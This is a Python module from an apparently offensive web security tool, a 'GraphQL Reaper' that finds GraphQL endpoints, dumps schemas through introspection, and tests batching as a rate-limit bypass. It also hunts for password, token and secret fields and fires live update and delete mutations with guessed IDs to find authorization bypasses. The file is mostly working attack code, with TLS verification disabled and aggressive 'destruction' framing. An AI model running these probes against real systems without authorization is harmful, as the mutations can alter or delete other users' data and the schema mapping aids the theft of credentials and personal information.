"""
Aura v25.0 OMEGA Professional+: GraphQL Reaper ⚛️
==================================================
Apex-tier GraphQL dominance engine.
Handles: Introspection, Blind Schema Mapping, Query Batching, and Recursive BOLA.
"""

import json
import asyncio
from rich.console import Console
from urllib.parse import urljoin

console = Console()

class GraphQLReaper:
    """
    OMEGA Professional+: GraphQL Protocol Dominance.
    Reconstructs entire schemas and executes high-impact logic attacks.
    """
    def __init__(self, target: str = None, session=None):
        self.target = target
        import httpx
        self.session = session or httpx.AsyncClient(verify=False)
        self.schema = {}
        self.endpoints = []

    async def run(self):
        """v25.0: The Full GraphQL Destruction Cycle."""
        all_findings = []
        if not self.target: return all_findings
        
        console.print(f"[bold cyan][⚛️ REAPER] Initiating GraphQL Dominance for {self.target}...[/bold cyan]")
        
        common_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql", "/query", "/api/v1/graphql"]
        
        for p in common_paths:
            url = urljoin(self.target, p)
            if await self._is_graphql(url):
                self.endpoints.append(url)
                # 1. Introspection Attack
                if await self.probe_introspection(url):
                    all_findings.append({
                        "type": "GraphQL Introspection Enabled",
                        "severity": "MEDIUM",
                        "url": url,
                        "content": "Full database schema leaked via Introspection query."
                    })
                else:
                    # 2. Blind Reconstruction (Future: Field Suggestion brute-force)
                    console.print(f"[yellow][!] Introspection blocked. Falling back to Blind Reconstruction...[/yellow]")
                
                # 3. Query Batching (Rate-limit bypass)
                batch_vuln = await self.test_batching(url)
                if batch_vuln:
                    all_findings.append(batch_vuln)
                
                # 4. Sensitive PII / Logic Mapping
                sensitive_nodes = self.map_sensitive_fields()
                if sensitive_nodes:
                    all_findings.append({
                        "type": "GraphQL Sensitive Object Exposure",
                        "severity": "HIGH",
                        "url": url,
                        "content": f"PII/Logic objects exposed in schema: {', '.join(sensitive_nodes[:10])}..."
                    })
                
                # 5. Recursive BOLA Audit on Queries/Mutations
                bola_findings = await self.audit_logic_flaws(url)
                all_findings.extend(bola_findings)
                
                break # Stop at first working endpoint
                
        return all_findings

    async def _is_graphql(self, url: str):
        """Quick check if endpoint is actually GraphQL."""
        try:
            resp = await self.session.post(url, json={"query": "{__typename}"})
            return resp and resp.status_code == 200 and "data" in resp.json()
        except: return False

    async def probe_introspection(self, url: str):
        """Attempts to dump the entire schema."""
        query = {
            "query": "{__schema{queryType{name}mutationType{name}types{kind name fields{name args{name type{kind name}}}}}}"
        }
        try:
            resp = await self.session.post(url, json=query)
            if resp and resp.status_code == 200:
                data = resp.json()
                if "data" in data and "__schema" in data["data"]:
                    console.print(f"[bold red][🔥] GraphQL Schema Recovered SUCCESSFUL.[/bold red]")
                    self.schema = data["data"]["__schema"]
                    return True
        except: pass
        return False

    async def test_batching(self, url: str):
        """Tests for JSON array batching (allows massive credential stuffing/scraping)."""
        # Sending 20 identical small queries
        batch_payload = [{"query": "{__typename}"} for _ in range(20)]
        try:
            resp = await self.session.post(url, json=batch_payload)
            if resp and resp.status_code == 200 and isinstance(resp.json(), list):
                console.print(f"[bold yellow][!] Batching Enabled on {url}. Rate-limiters bypassed.[/bold yellow]")
                return {
                    "type": "GraphQL Query Batching",
                    "severity": "MEDIUM",
                    "url": url,
                    "content": "Backend accepts JSON arrays of queries, facilitating massive bypass of rate-limits."
                }
        except: pass
        return None

    def map_sensitive_fields(self):
        if not self.schema: return []
        high_value = ["password", "token", "secret", "admin", "email", "phone", "address", "balance", "credit"]
        leaks = []
        for t in self.schema.get("types", []):
            if t.get("kind") == "OBJECT":
                for field in t.get("fields") or []:
                    name = field.get("name", "").lower()
                    if any(k in name for k in high_value):
                        leaks.append(f"{t.get('name')}.{name}")
        return leaks

    async def audit_logic_flaws(self, url: str):
        """Performs precise logic probes based on the mapped schema."""
        findings = []
        if not self.schema: return findings
        
        # Identify Mutations that look like profile/account updates
        for t in self.schema.get("types", []):
            if t.get("name") == self.schema.get("mutationType", {}).get("name"):
                for field in t.get("fields") or []:
                    m_name = field.get("name")
                    if any(x in m_name.lower() for x in ["update", "delete", "change", "set"]):
                        # Test for BOLA: Sending mutation with a random ID
                        res = await self._test_mutation_bola(url, m_name, field.get("args", []))
                        if res: findings.append(res)
        return findings

    async def _test_mutation_bola(self, url: str, mut_name: str, args: list):
        """Constructs and tests a BOLA mutation."""
        id_args = [a for a in args if "id" in a.get("name", "").lower()]
        if not id_args: return None
        
        # Payload: mutation { updateAccount(id: "9999", email: "aura@attack.local") { id } }
        arg_str = ", ".join([f'{a["name"]}: "9999"' for a in id_args])
        query = {"query": f"mutation {{ {mut_name}({arg_str}) {{ id }} }}"}
        
        try:
            resp = await self.session.post(url, json=query)
            # If we get a 200, but an authorization error in the 'errors' array, it's safe.
            # If we get data back, or a success message, it's likely BOLA.
            if resp and resp.status_code == 200:
                data = resp.json()
                if not data.get("errors"):
                    console.print(f"[bold red][⚓ BOLA] Potential logic flaw in mutation {mut_name}[/bold red]")
                    return {
                        "type": "GraphQL BOLA / Authorization Bypass",
                        "severity": "CRITICAL",
                        "url": url,
                        "content": f"Mutation `{mut_name}` accepts object IDs without sufficient ownership validation."
                    }
        except: pass
        return None
